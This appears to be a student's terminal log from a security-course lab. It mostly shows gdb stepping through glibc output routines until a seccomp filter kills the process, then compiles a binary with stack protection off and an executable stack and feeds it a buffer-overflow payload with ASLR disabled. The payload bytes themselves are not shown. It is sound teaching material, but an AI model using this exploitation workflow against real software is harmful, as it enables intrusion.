   0x7ffff78376db <_IO_puts+75>:	lock cmpxchg %esi,(%rdx)
   0x7ffff78376df <_IO_puts+79>:	jne    0x7ffff78376e8 <_IO_puts+88>
0x00007ffff78376d9	36	in ioputs.c
(gdb) 
=> 0x7ffff78376e3 <_IO_puts+83>:	cmpxchg %esi,(%rdx)
   0x7ffff78376e6 <_IO_puts+86>:	je     0x7ffff78376fe <_IO_puts+110>
   0x7ffff78376e8 <_IO_puts+88>:	lea    (%rdx),%rdi
0x00007ffff78376e3	36	in ioputs.c
(gdb) 
=> 0x7ffff78376e6 <_IO_puts+86>:	je     0x7ffff78376fe <_IO_puts+110>
   0x7ffff78376e8 <_IO_puts+88>:	lea    (%rdx),%rdi
   0x7ffff78376eb <_IO_puts+91>:	sub    $0x80,%rsp
0x00007ffff78376e6	36	in ioputs.c
(gdb) 
=> 0x7ffff78376fe <_IO_puts+110>:	mov    0x88(%rbp),%rdx
   0x7ffff7837705 <_IO_puts+117>:	mov    0x355ffc(%rip),%rdi        # 0x7ffff7b8d708 <stdout>
   0x7ffff783770c <_IO_puts+124>:	mov    %r8,0x8(%rdx)
0x00007ffff78376fe	36	in ioputs.c
(gdb) 
=> 0x7ffff7837705 <_IO_puts+117>:	mov    0x355ffc(%rip),%rdi        # 0x7ffff7b8d708 <stdout>
   0x7ffff783770c <_IO_puts+124>:	mov    %r8,0x8(%rdx)
   0x7ffff7837710 <_IO_puts+128>:	addl   $0x1,0x4(%rdx)
0x00007ffff7837705	36	in ioputs.c
(gdb) 
=> 0x7ffff783770c <_IO_puts+124>:	mov    %r8,0x8(%rdx)
   0x7ffff7837710 <_IO_puts+128>:	addl   $0x1,0x4(%rdx)
   0x7ffff7837714 <_IO_puts+132>:	mov    0xc0(%rdi),%eax
0x00007ffff783770c	36	in ioputs.c
(gdb) 
=> 0x7ffff7837710 <_IO_puts+128>:	addl   $0x1,0x4(%rdx)
   0x7ffff7837714 <_IO_puts+132>:	mov    0xc0(%rdi),%eax
   0x7ffff783771a <_IO_puts+138>:	test   %eax,%eax
0x00007ffff7837710	36	in ioputs.c
(gdb) 
=> 0x7ffff7837714 <_IO_puts+132>:	mov    0xc0(%rdi),%eax
   0x7ffff783771a <_IO_puts+138>:	test   %eax,%eax
   0x7ffff783771c <_IO_puts+140>:	jne    0x7ffff7837788 <_IO_puts+248>
39	in ioputs.c
(gdb) 
=> 0x7ffff783771a <_IO_puts+138>:	test   %eax,%eax
   0x7ffff783771c <_IO_puts+140>:	jne    0x7ffff7837788 <_IO_puts+248>
   0x7ffff783771e <_IO_puts+142>:	movl   $0xffffffff,0xc0(%rdi)
0x00007ffff783771a	39	in ioputs.c
(gdb) 
=> 0x7ffff783771c <_IO_puts+140>:	jne    0x7ffff7837788 <_IO_puts+248>
   0x7ffff783771e <_IO_puts+142>:	movl   $0xffffffff,0xc0(%rdi)
   0x7ffff7837728 <_IO_puts+152>:	mov    0xd8(%rdi),%rax
0x00007ffff783771c	39	in ioputs.c
(gdb) 
=> 0x7ffff783771e <_IO_puts+142>:	movl   $0xffffffff,0xc0(%rdi)
   0x7ffff7837728 <_IO_puts+152>:	mov    0xd8(%rdi),%rax
   0x7ffff783772f <_IO_puts+159>:	mov    %rbx,%rdx
0x00007ffff783771e	39	in ioputs.c
(gdb) 
=> 0x7ffff7837728 <_IO_puts+152>:	mov    0xd8(%rdi),%rax
   0x7ffff783772f <_IO_puts+159>:	mov    %rbx,%rdx
   0x7ffff7837732 <_IO_puts+162>:	mov    %r12,%rsi
40	in ioputs.c
(gdb) 
=> 0x7ffff783772f <_IO_puts+159>:	mov    %rbx,%rdx
   0x7ffff7837732 <_IO_puts+162>:	mov    %r12,%rsi
   0x7ffff7837735 <_IO_puts+165>:	callq  *0x38(%rax)
0x00007ffff783772f	40	in ioputs.c
(gdb) 
=> 0x7ffff7837732 <_IO_puts+162>:	mov    %r12,%rsi
   0x7ffff7837735 <_IO_puts+165>:	callq  *0x38(%rax)
   0x7ffff7837738 <_IO_puts+168>:	cmp    %rax,%rbx
0x00007ffff7837732	40	in ioputs.c
(gdb) 
=> 0x7ffff7837735 <_IO_puts+165>:	callq  *0x38(%rax)
   0x7ffff7837738 <_IO_puts+168>:	cmp    %rax,%rbx
   0x7ffff783773b <_IO_puts+171>:	jne    0x7ffff783778d <_IO_puts+253>
0x00007ffff7837735	40	in ioputs.c
(gdb) 
=> 0x7ffff78411e0 <_IO_new_file_xsputn>:	xor    %eax,%eax
   0x7ffff78411e2 <_IO_new_file_xsputn+2>:	test   %rdx,%rdx
   0x7ffff78411e5 <_IO_new_file_xsputn+5>:	je     0x7ffff784126f <_IO_new_file_xsputn+143>
_IO_new_file_xsputn (f=0x7ffff7b8d620 <_IO_2_1_stdout_>, data=0x400b0b, n=26) at fileops.c:1287
1287	fileops.c: No such file or directory.
(gdb) 
=> 0x7ffff78411e2 <_IO_new_file_xsputn+2>:	test   %rdx,%rdx
   0x7ffff78411e5 <_IO_new_file_xsputn+5>:	je     0x7ffff784126f <_IO_new_file_xsputn+143>
   0x7ffff78411eb <_IO_new_file_xsputn+11>:	push   %r15
1286	in fileops.c
(gdb) 
=> 0x7ffff78411e5 <_IO_new_file_xsputn+5>:	je     0x7ffff784126f <_IO_new_file_xsputn+143>
   0x7ffff78411eb <_IO_new_file_xsputn+11>:	push   %r15
   0x7ffff78411ed <_IO_new_file_xsputn+13>:	push   %r14
0x00007ffff78411e5	1286	in fileops.c
(gdb) 
=> 0x7ffff78411eb <_IO_new_file_xsputn+11>:	push   %r15
   0x7ffff78411ed <_IO_new_file_xsputn+13>:	push   %r14
   0x7ffff78411ef <_IO_new_file_xsputn+15>:	push   %r13
1280	in fileops.c
(gdb) 
=> 0x7ffff78411ed <_IO_new_file_xsputn+13>:	push   %r14
   0x7ffff78411ef <_IO_new_file_xsputn+15>:	push   %r13
   0x7ffff78411f1 <_IO_new_file_xsputn+17>:	push   %r12
0x00007ffff78411ed	1280	in fileops.c
(gdb) 
=> 0x7ffff78411ef <_IO_new_file_xsputn+15>:	push   %r13
   0x7ffff78411f1 <_IO_new_file_xsputn+17>:	push   %r12
   0x7ffff78411f3 <_IO_new_file_xsputn+19>:	mov    %rsi,%r13
0x00007ffff78411ef	1280	in fileops.c
(gdb) 
=> 0x7ffff78411f1 <_IO_new_file_xsputn+17>:	push   %r12
   0x7ffff78411f3 <_IO_new_file_xsputn+19>:	mov    %rsi,%r13
   0x7ffff78411f6 <_IO_new_file_xsputn+22>:	push   %rbp
0x00007ffff78411f1	1280	in fileops.c
(gdb) 
=> 0x7ffff78411f3 <_IO_new_file_xsputn+19>:	mov    %rsi,%r13
   0x7ffff78411f6 <_IO_new_file_xsputn+22>:	push   %rbp
   0x7ffff78411f7 <_IO_new_file_xsputn+23>:	push   %rbx
0x00007ffff78411f3	1280	in fileops.c
(gdb) 
=> 0x7ffff78411f6 <_IO_new_file_xsputn+22>:	push   %rbp
   0x7ffff78411f7 <_IO_new_file_xsputn+23>:	push   %rbx
   0x7ffff78411f8 <_IO_new_file_xsputn+24>:	mov    %rdx,%r12
0x00007ffff78411f6	1280	in fileops.c
(gdb) 
=> 0x7ffff78411f7 <_IO_new_file_xsputn+23>:	push   %rbx
   0x7ffff78411f8 <_IO_new_file_xsputn+24>:	mov    %rdx,%r12
   0x7ffff78411fb <_IO_new_file_xsputn+27>:	mov    %rdi,%rbx
0x00007ffff78411f7	1280	in fileops.c
(gdb) 
=> 0x7ffff78411f8 <_IO_new_file_xsputn+24>:	mov    %rdx,%r12
   0x7ffff78411fb <_IO_new_file_xsputn+27>:	mov    %rdi,%rbx
   0x7ffff78411fe <_IO_new_file_xsputn+30>:	sub    $0x8,%rsp
0x00007ffff78411f8	1280	in fileops.c
(gdb) 
=> 0x7ffff78411fb <_IO_new_file_xsputn+27>:	mov    %rdi,%rbx
   0x7ffff78411fe <_IO_new_file_xsputn+30>:	sub    $0x8,%rsp
   0x7ffff7841202 <_IO_new_file_xsputn+34>:	mov    (%rdi),%eax
0x00007ffff78411fb	1280	in fileops.c
(gdb) 
=> 0x7ffff78411fe <_IO_new_file_xsputn+30>:	sub    $0x8,%rsp
   0x7ffff7841202 <_IO_new_file_xsputn+34>:	mov    (%rdi),%eax
   0x7ffff7841204 <_IO_new_file_xsputn+36>:	and    $0xa00,%eax
0x00007ffff78411fe	1280	in fileops.c
(gdb) 
=> 0x7ffff7841202 <_IO_new_file_xsputn+34>:	mov    (%rdi),%eax
   0x7ffff7841204 <_IO_new_file_xsputn+36>:	and    $0xa00,%eax
   0x7ffff7841209 <_IO_new_file_xsputn+41>:	cmp    $0xa00,%eax
1293	in fileops.c
(gdb) 
=> 0x7ffff7841204 <_IO_new_file_xsputn+36>:	and    $0xa00,%eax
   0x7ffff7841209 <_IO_new_file_xsputn+41>:	cmp    $0xa00,%eax
   0x7ffff784120e <_IO_new_file_xsputn+46>:	je     0x7ffff78412d0 <_IO_new_file_xsputn+240>
0x00007ffff7841204	1293	in fileops.c
(gdb) 
=> 0x7ffff7841209 <_IO_new_file_xsputn+41>:	cmp    $0xa00,%eax
   0x7ffff784120e <_IO_new_file_xsputn+46>:	je     0x7ffff78412d0 <_IO_new_file_xsputn+240>
   0x7ffff7841214 <_IO_new_file_xsputn+52>:	mov    0x30(%rdi),%rdx
0x00007ffff7841209	1293	in fileops.c
(gdb) 
=> 0x7ffff784120e <_IO_new_file_xsputn+46>:	je     0x7ffff78412d0 <_IO_new_file_xsputn+240>
   0x7ffff7841214 <_IO_new_file_xsputn+52>:	mov    0x30(%rdi),%rdx
   0x7ffff7841218 <_IO_new_file_xsputn+56>:	mov    0x28(%rdi),%rdi
0x00007ffff784120e	1293	in fileops.c
(gdb) 
=> 0x7ffff7841214 <_IO_new_file_xsputn+52>:	mov    0x30(%rdi),%rdx
   0x7ffff7841218 <_IO_new_file_xsputn+56>:	mov    0x28(%rdi),%rdi
   0x7ffff784121c <_IO_new_file_xsputn+60>:	cmp    %rdi,%rdx
1310	in fileops.c
(gdb) 
=> 0x7ffff7841218 <_IO_new_file_xsputn+56>:	mov    0x28(%rdi),%rdi
   0x7ffff784121c <_IO_new_file_xsputn+60>:	cmp    %rdi,%rdx
   0x7ffff784121f <_IO_new_file_xsputn+63>:	jbe    0x7ffff7841278 <_IO_new_file_xsputn+152>
0x00007ffff7841218	1310	in fileops.c
(gdb) 
=> 0x7ffff784121c <_IO_new_file_xsputn+60>:	cmp    %rdi,%rdx
   0x7ffff784121f <_IO_new_file_xsputn+63>:	jbe    0x7ffff7841278 <_IO_new_file_xsputn+152>
   0x7ffff7841221 <_IO_new_file_xsputn+65>:	sub    %rdi,%rdx
0x00007ffff784121c	1310	in fileops.c
(gdb) 
=> 0x7ffff784121f <_IO_new_file_xsputn+63>:	jbe    0x7ffff7841278 <_IO_new_file_xsputn+152>
   0x7ffff7841221 <_IO_new_file_xsputn+65>:	sub    %rdi,%rdx
   0x7ffff7841224 <_IO_new_file_xsputn+68>:	xor    %r14d,%r14d
0x00007ffff784121f	1310	in fileops.c
(gdb) 
=> 0x7ffff7841278 <_IO_new_file_xsputn+152>:	mov    0xd8(%rbx),%rax
   0x7ffff784127f <_IO_new_file_xsputn+159>:	mov    $0xffffffff,%esi
   0x7ffff7841284 <_IO_new_file_xsputn+164>:	mov    %rbx,%rdi
1331	in fileops.c
(gdb) 
=> 0x7ffff784127f <_IO_new_file_xsputn+159>:	mov    $0xffffffff,%esi
   0x7ffff7841284 <_IO_new_file_xsputn+164>:	mov    %rbx,%rdi
   0x7ffff7841287 <_IO_new_file_xsputn+167>:	mov    %r12,%rbp
0x00007ffff784127f	1331	in fileops.c
(gdb) 
=> 0x7ffff7841284 <_IO_new_file_xsputn+164>:	mov    %rbx,%rdi
   0x7ffff7841287 <_IO_new_file_xsputn+167>:	mov    %r12,%rbp
   0x7ffff784128a <_IO_new_file_xsputn+170>:	callq  *0x18(%rax)
0x00007ffff7841284	1331	in fileops.c
(gdb) 
=> 0x7ffff7841287 <_IO_new_file_xsputn+167>:	mov    %r12,%rbp
   0x7ffff784128a <_IO_new_file_xsputn+170>:	callq  *0x18(%rax)
   0x7ffff784128d <_IO_new_file_xsputn+173>:	cmp    $0xffffffff,%eax
0x00007ffff7841287	1331	in fileops.c
(gdb) 
=> 0x7ffff784128a <_IO_new_file_xsputn+170>:	callq  *0x18(%rax)
   0x7ffff784128d <_IO_new_file_xsputn+173>:	cmp    $0xffffffff,%eax
   0x7ffff7841290 <_IO_new_file_xsputn+176>:	je     0x7ffff784125b <_IO_new_file_xsputn+123>
0x00007ffff784128a	1331	in fileops.c
(gdb) 
=> 0x7ffff7842730 <_IO_new_file_overflow>:	mov    (%rdi),%ecx
   0x7ffff7842732 <_IO_new_file_overflow+2>:	test   $0x8,%cl
   0x7ffff7842735 <_IO_new_file_overflow+5>:	jne    0x7ffff78428d0 <_IO_new_file_overflow+416>
_IO_new_file_overflow (f=0x7ffff7b8d620 <_IO_2_1_stdout_>, ch=-1) at fileops.c:808
808	in fileops.c
(gdb) 
=> 0x7ffff7842732 <_IO_new_file_overflow+2>:	test   $0x8,%cl
   0x7ffff7842735 <_IO_new_file_overflow+5>:	jne    0x7ffff78428d0 <_IO_new_file_overflow+416>
   0x7ffff784273b <_IO_new_file_overflow+11>:	test   $0x8,%ch
0x00007ffff7842732	808	in fileops.c
(gdb) 
=> 0x7ffff7842735 <_IO_new_file_overflow+5>:	jne    0x7ffff78428d0 <_IO_new_file_overflow+416>
   0x7ffff784273b <_IO_new_file_overflow+11>:	test   $0x8,%ch
   0x7ffff784273e <_IO_new_file_overflow+14>:	push   %r12
0x00007ffff7842735	808	in fileops.c
(gdb) 
=> 0x7ffff784273b <_IO_new_file_overflow+11>:	test   $0x8,%ch
   0x7ffff784273e <_IO_new_file_overflow+14>:	push   %r12
   0x7ffff7842740 <_IO_new_file_overflow+16>:	push   %rbp
815	in fileops.c
(gdb) 
=> 0x7ffff784273e <_IO_new_file_overflow+14>:	push   %r12
   0x7ffff7842740 <_IO_new_file_overflow+16>:	push   %rbp
   0x7ffff7842741 <_IO_new_file_overflow+17>:	mov    %esi,%ebp
807	in fileops.c
(gdb) 
=> 0x7ffff7842740 <_IO_new_file_overflow+16>:	push   %rbp
   0x7ffff7842741 <_IO_new_file_overflow+17>:	mov    %esi,%ebp
   0x7ffff7842743 <_IO_new_file_overflow+19>:	push   %rbx
0x00007ffff7842740	807	in fileops.c
(gdb) 
=> 0x7ffff7842741 <_IO_new_file_overflow+17>:	mov    %esi,%ebp
   0x7ffff7842743 <_IO_new_file_overflow+19>:	push   %rbx
   0x7ffff7842744 <_IO_new_file_overflow+20>:	mov    %rdi,%rbx
0x00007ffff7842741	807	in fileops.c
(gdb) 
=> 0x7ffff7842743 <_IO_new_file_overflow+19>:	push   %rbx
   0x7ffff7842744 <_IO_new_file_overflow+20>:	mov    %rdi,%rbx
   0x7ffff7842747 <_IO_new_file_overflow+23>:	je     0x7ffff7842798 <_IO_new_file_overflow+104>
0x00007ffff7842743	807	in fileops.c
(gdb) 
=> 0x7ffff7842744 <_IO_new_file_overflow+20>:	mov    %rdi,%rbx
   0x7ffff7842747 <_IO_new_file_overflow+23>:	je     0x7ffff7842798 <_IO_new_file_overflow+104>
   0x7ffff7842749 <_IO_new_file_overflow+25>:	mov    0x20(%rdi),%rsi
0x00007ffff7842744	807	in fileops.c
(gdb) 
=> 0x7ffff7842747 <_IO_new_file_overflow+23>:	je     0x7ffff7842798 <_IO_new_file_overflow+104>
   0x7ffff7842749 <_IO_new_file_overflow+25>:	mov    0x20(%rdi),%rsi
   0x7ffff784274d <_IO_new_file_overflow+29>:	test   %rsi,%rsi
815	in fileops.c
(gdb) 
=> 0x7ffff7842798 <_IO_new_file_overflow+104>:	cmpq   $0x0,0x20(%rdi)
   0x7ffff784279d <_IO_new_file_overflow+109>:	je     0x7ffff78428f0 <_IO_new_file_overflow+448>
   0x7ffff78427a3 <_IO_new_file_overflow+115>:	mov    0x8(%rdi),%rdx
818	in fileops.c
(gdb) 
=> 0x7ffff784279d <_IO_new_file_overflow+109>:	je     0x7ffff78428f0 <_IO_new_file_overflow+448>
   0x7ffff78427a3 <_IO_new_file_overflow+115>:	mov    0x8(%rdi),%rdx
   0x7ffff78427a7 <_IO_new_file_overflow+119>:	test   $0x1,%ch
0x00007ffff784279d	818	in fileops.c
(gdb) 
=> 0x7ffff78428f0 <_IO_new_file_overflow+448>:	mov    %rbx,%rdi
   0x7ffff78428f3 <_IO_new_file_overflow+451>:	callq  0x7ffff7843560 <__GI__IO_doallocbuf>
   0x7ffff78428f8 <_IO_new_file_overflow+456>:	mov    0x38(%rbx),%rdx
820	in fileops.c
(gdb) 
=> 0x7ffff78428f3 <_IO_new_file_overflow+451>:	callq  0x7ffff7843560 <__GI__IO_doallocbuf>
   0x7ffff78428f8 <_IO_new_file_overflow+456>:	mov    0x38(%rbx),%rdx
   0x7ffff78428fc <_IO_new_file_overflow+460>:	mov    (%rbx),%ecx
0x00007ffff78428f3	820	in fileops.c
(gdb) 
=> 0x7ffff7843560 <__GI__IO_doallocbuf>:	cmpq   $0x0,0x38(%rdi)
   0x7ffff7843565 <__GI__IO_doallocbuf+5>:	je     0x7ffff7843570 <__GI__IO_doallocbuf+16>
   0x7ffff7843567 <__GI__IO_doallocbuf+7>:	retq   
__GI__IO_doallocbuf (fp=fp@entry=0x7ffff7b8d620 <_IO_2_1_stdout_>) at genops.c:395
395	genops.c: No such file or directory.
(gdb) 
=> 0x7ffff7843565 <__GI__IO_doallocbuf+5>:	je     0x7ffff7843570 <__GI__IO_doallocbuf+16>
   0x7ffff7843567 <__GI__IO_doallocbuf+7>:	retq   
   0x7ffff7843568 <__GI__IO_doallocbuf+8>:	nopl   0x0(%rax,%rax,1)
0x00007ffff7843565	395	in genops.c
(gdb) 
=> 0x7ffff7843570 <__GI__IO_doallocbuf+16>:	push   %r12
   0x7ffff7843572 <__GI__IO_doallocbuf+18>:	push   %rbp
   0x7ffff7843573 <__GI__IO_doallocbuf+19>:	push   %rbx
394	in genops.c
(gdb) 
=> 0x7ffff7843572 <__GI__IO_doallocbuf+18>:	push   %rbp
   0x7ffff7843573 <__GI__IO_doallocbuf+19>:	push   %rbx
   0x7ffff7843574 <__GI__IO_doallocbuf+20>:	mov    (%rdi),%eax
0x00007ffff7843572	394	in genops.c
(gdb) 
=> 0x7ffff7843573 <__GI__IO_doallocbuf+19>:	push   %rbx
   0x7ffff7843574 <__GI__IO_doallocbuf+20>:	mov    (%rdi),%eax
   0x7ffff7843576 <__GI__IO_doallocbuf+22>:	mov    %rdi,%rbx
0x00007ffff7843573	394	in genops.c
(gdb) 
=> 0x7ffff7843574 <__GI__IO_doallocbuf+20>:	mov    (%rdi),%eax
   0x7ffff7843576 <__GI__IO_doallocbuf+22>:	mov    %rdi,%rbx
   0x7ffff7843579 <__GI__IO_doallocbuf+25>:	test   $0x2,%al
397	in genops.c
(gdb) 
=> 0x7ffff7843576 <__GI__IO_doallocbuf+22>:	mov    %rdi,%rbx
   0x7ffff7843579 <__GI__IO_doallocbuf+25>:	test   $0x2,%al
   0x7ffff784357b <__GI__IO_doallocbuf+27>:	je     0x7ffff7843587 <__GI__IO_doallocbuf+39>
0x00007ffff7843576	397	in genops.c
(gdb) 
=> 0x7ffff7843579 <__GI__IO_doallocbuf+25>:	test   $0x2,%al
   0x7ffff784357b <__GI__IO_doallocbuf+27>:	je     0x7ffff7843587 <__GI__IO_doallocbuf+39>
   0x7ffff784357d <__GI__IO_doallocbuf+29>:	mov    0xc0(%rdi),%edx
0x00007ffff7843579	397	in genops.c
(gdb) 
=> 0x7ffff784357b <__GI__IO_doallocbuf+27>:	je     0x7ffff7843587 <__GI__IO_doallocbuf+39>
   0x7ffff784357d <__GI__IO_doallocbuf+29>:	mov    0xc0(%rdi),%edx
   0x7ffff7843583 <__GI__IO_doallocbuf+35>:	test   %edx,%edx
0x00007ffff784357b	397	in genops.c
(gdb) 
=> 0x7ffff7843587 <__GI__IO_doallocbuf+39>:	mov    0xd8(%rbx),%rax
   0x7ffff784358e <__GI__IO_doallocbuf+46>:	mov    %rbx,%rdi
   0x7ffff7843591 <__GI__IO_doallocbuf+49>:	callq  *0x68(%rax)
398	in genops.c
(gdb) 
=> 0x7ffff784358e <__GI__IO_doallocbuf+46>:	mov    %rbx,%rdi
   0x7ffff7843591 <__GI__IO_doallocbuf+49>:	callq  *0x68(%rax)
   0x7ffff7843594 <__GI__IO_doallocbuf+52>:	cmp    $0xffffffff,%eax
0x00007ffff784358e	398	in genops.c
(gdb) 
=> 0x7ffff7843591 <__GI__IO_doallocbuf+49>:	callq  *0x68(%rax)
   0x7ffff7843594 <__GI__IO_doallocbuf+52>:	cmp    $0xffffffff,%eax
   0x7ffff7843597 <__GI__IO_doallocbuf+55>:	je     0x7ffff78435a0 <__GI__IO_doallocbuf+64>
0x00007ffff7843591	398	in genops.c
(gdb) 
=> 0x7ffff7835180 <__GI__IO_file_doallocate>:	push   %r12
   0x7ffff7835182 <__GI__IO_file_doallocate+2>:	push   %rbp
   0x7ffff7835183 <__GI__IO_file_doallocate+3>:	mov    %rdi,%rbp
__GI__IO_file_doallocate (fp=0x7ffff7b8d620 <_IO_2_1_stdout_>) at filedoalloc.c:95
95	filedoalloc.c: No such file or directory.
(gdb) 
=> 0x7ffff7835182 <__GI__IO_file_doallocate+2>:	push   %rbp
   0x7ffff7835183 <__GI__IO_file_doallocate+3>:	mov    %rdi,%rbp
   0x7ffff7835186 <__GI__IO_file_doallocate+6>:	push   %rbx
0x00007ffff7835182	95	in filedoalloc.c
(gdb) 
=> 0x7ffff7835183 <__GI__IO_file_doallocate+3>:	mov    %rdi,%rbp
   0x7ffff7835186 <__GI__IO_file_doallocate+6>:	push   %rbx
   0x7ffff7835187 <__GI__IO_file_doallocate+7>:	sub    $0x90,%rsp
0x00007ffff7835183	95	in filedoalloc.c
(gdb) 
=> 0x7ffff7835186 <__GI__IO_file_doallocate+6>:	push   %rbx
   0x7ffff7835187 <__GI__IO_file_doallocate+7>:	sub    $0x90,%rsp
   0x7ffff783518e <__GI__IO_file_doallocate+14>:	mov    0x70(%rdi),%eax
0x00007ffff7835186	95	in filedoalloc.c
(gdb) 
=> 0x7ffff7835187 <__GI__IO_file_doallocate+7>:	sub    $0x90,%rsp
   0x7ffff783518e <__GI__IO_file_doallocate+14>:	mov    0x70(%rdi),%eax
   0x7ffff7835191 <__GI__IO_file_doallocate+17>:	test   %eax,%eax
0x00007ffff7835187	95	in filedoalloc.c
(gdb) 
=> 0x7ffff783518e <__GI__IO_file_doallocate+14>:	mov    0x70(%rdi),%eax
   0x7ffff7835191 <__GI__IO_file_doallocate+17>:	test   %eax,%eax
   0x7ffff7835193 <__GI__IO_file_doallocate+19>:	js     0x7ffff78351c8 <__GI__IO_file_doallocate+72>
110	in filedoalloc.c
(gdb) 
=> 0x7ffff7835191 <__GI__IO_file_doallocate+17>:	test   %eax,%eax
   0x7ffff7835193 <__GI__IO_file_doallocate+19>:	js     0x7ffff78351c8 <__GI__IO_file_doallocate+72>
   0x7ffff7835195 <__GI__IO_file_doallocate+21>:	mov    0xd8(%rdi),%rax
0x00007ffff7835191	110	in filedoalloc.c
(gdb) 
=> 0x7ffff7835193 <__GI__IO_file_doallocate+19>:	js     0x7ffff78351c8 <__GI__IO_file_doallocate+72>
   0x7ffff7835195 <__GI__IO_file_doallocate+21>:	mov    0xd8(%rdi),%rax
   0x7ffff783519c <__GI__IO_file_doallocate+28>:	mov    %rsp,%rsi
0x00007ffff7835193	110	in filedoalloc.c
(gdb) 
=> 0x7ffff7835195 <__GI__IO_file_doallocate+21>:	mov    0xd8(%rdi),%rax
   0x7ffff783519c <__GI__IO_file_doallocate+28>:	mov    %rsp,%rsi
   0x7ffff783519f <__GI__IO_file_doallocate+31>:	callq  *0x90(%rax)
0x00007ffff7835195	110	in filedoalloc.c
(gdb) 
=> 0x7ffff783519c <__GI__IO_file_doallocate+28>:	mov    %rsp,%rsi
   0x7ffff783519f <__GI__IO_file_doallocate+31>:	callq  *0x90(%rax)
   0x7ffff78351a5 <__GI__IO_file_doallocate+37>:	test   %eax,%eax
0x00007ffff783519c	110	in filedoalloc.c
(gdb) 
=> 0x7ffff783519f <__GI__IO_file_doallocate+31>:	callq  *0x90(%rax)
   0x7ffff78351a5 <__GI__IO_file_doallocate+37>:	test   %eax,%eax
   0x7ffff78351a7 <__GI__IO_file_doallocate+39>:	js     0x7ffff78351c8 <__GI__IO_file_doallocate+72>
0x00007ffff783519f	110	in filedoalloc.c
(gdb) 
=> 0x7ffff7840b60 <__GI__IO_file_stat>:	mov    %rsi,%rdx
   0x7ffff7840b63 <__GI__IO_file_stat+3>:	mov    0x70(%rdi),%esi
   0x7ffff7840b66 <__GI__IO_file_stat+6>:	mov    $0x1,%edi
__GI__IO_file_stat (fp=0x7ffff7b8d620 <_IO_2_1_stdout_>, st=0x7fffffffdfb0) at fileops.c:1229
1229	fileops.c: No such file or directory.
(gdb) 
=> 0x7ffff7840b63 <__GI__IO_file_stat+3>:	mov    0x70(%rdi),%esi
   0x7ffff7840b66 <__GI__IO_file_stat+6>:	mov    $0x1,%edi
   0x7ffff7840b6b <__GI__IO_file_stat+11>:	jmpq   0x7ffff78bec20 <__GI___fxstat>
1230	in fileops.c
(gdb) 
=> 0x7ffff7840b66 <__GI__IO_file_stat+6>:	mov    $0x1,%edi
   0x7ffff7840b6b <__GI__IO_file_stat+11>:	jmpq   0x7ffff78bec20 <__GI___fxstat>
   0x7ffff7840b70 <_IO_new_file_write>:	test   %rdx,%rdx
0x00007ffff7840b66	1230	in fileops.c
(gdb) 
=> 0x7ffff7840b6b <__GI__IO_file_stat+11>:	jmpq   0x7ffff78bec20 <__GI___fxstat>
   0x7ffff7840b70 <_IO_new_file_write>:	test   %rdx,%rdx
   0x7ffff7840b73 <_IO_new_file_write+3>:	push   %r14
0x00007ffff7840b6b	1230	in fileops.c
(gdb) 
=> 0x7ffff78bec20 <__GI___fxstat>:	cmp    $0x1,%edi
   0x7ffff78bec23 <__GI___fxstat+3>:	mov    %esi,%eax
   0x7ffff78bec25 <__GI___fxstat+5>:	ja     0x7ffff78bec58 <__GI___fxstat+56>
__GI___fxstat (vers=1, fd=1, buf=0x7fffffffdfb0) at ../sysdeps/unix/sysv/linux/wordsize-64/fxstat.c:34
34	../sysdeps/unix/sysv/linux/wordsize-64/fxstat.c: No such file or directory.
(gdb) 
=> 0x7ffff78bec23 <__GI___fxstat+3>:	mov    %esi,%eax
   0x7ffff78bec25 <__GI___fxstat+5>:	ja     0x7ffff78bec58 <__GI___fxstat+56>
   0x7ffff78bec27 <__GI___fxstat+7>:	movslq %eax,%rdi
33	in ../sysdeps/unix/sysv/linux/wordsize-64/fxstat.c
(gdb) 
=> 0x7ffff78bec25 <__GI___fxstat+5>:	ja     0x7ffff78bec58 <__GI___fxstat+56>
   0x7ffff78bec27 <__GI___fxstat+7>:	movslq %eax,%rdi
   0x7ffff78bec2a <__GI___fxstat+10>:	mov    %rdx,%rsi
34	in ../sysdeps/unix/sysv/linux/wordsize-64/fxstat.c
(gdb) 
=> 0x7ffff78bec27 <__GI___fxstat+7>:	movslq %eax,%rdi
   0x7ffff78bec2a <__GI___fxstat+10>:	mov    %rdx,%rsi
   0x7ffff78bec2d <__GI___fxstat+13>:	mov    $0x5,%eax
35	in ../sysdeps/unix/sysv/linux/wordsize-64/fxstat.c
(gdb) 
=> 0x7ffff78bec2a <__GI___fxstat+10>:	mov    %rdx,%rsi
   0x7ffff78bec2d <__GI___fxstat+13>:	mov    $0x5,%eax
   0x7ffff78bec32 <__GI___fxstat+18>:	syscall 
0x00007ffff78bec2a	35	in ../sysdeps/unix/sysv/linux/wordsize-64/fxstat.c
(gdb) 
=> 0x7ffff78bec2d <__GI___fxstat+13>:	mov    $0x5,%eax
   0x7ffff78bec32 <__GI___fxstat+18>:	syscall 
   0x7ffff78bec34 <__GI___fxstat+20>:	cmp    $0xfffffffffffff000,%rax
0x00007ffff78bec2d	35	in ../sysdeps/unix/sysv/linux/wordsize-64/fxstat.c
(gdb) 
=> 0x7ffff78bec32 <__GI___fxstat+18>:	syscall 
   0x7ffff78bec34 <__GI___fxstat+20>:	cmp    $0xfffffffffffff000,%rax
   0x7ffff78bec3a <__GI___fxstat+26>:	ja     0x7ffff78bec40 <__GI___fxstat+32>
0x00007ffff78bec32	35	in ../sysdeps/unix/sysv/linux/wordsize-64/fxstat.c
(gdb) 

Program terminated with signal SIGSYS, Bad system call.
The program no longer exists.
Error while running hook_stop:
No registers.
(gdb) 
The program is not being run.
(gdb) 
The program is not being run.
(gdb) 
The program is not being run.
(gdb) 
The program is not being run.
(gdb) 
The program is not being run.
(gdb) quit
ryadav3@nemo:~/576/labs/lab9/vul$ vim sec_prog1.c 
ryadav3@nemo:~/576/labs/lab9/vul$ make
gcc -fno-stack-protector -z execstack -O0  -o sec_prog sec_prog1.c -lseccomp
ryadav3@nemo:~/576/labs/lab9/vul$ setarch x86_64 -R ./sec_prog < payload
Enter verification string?
Verifying: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?????
Bad system call
ryadav3@nemo:~/576/labs/lab9/vul$ gdb ./sec_prog 
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
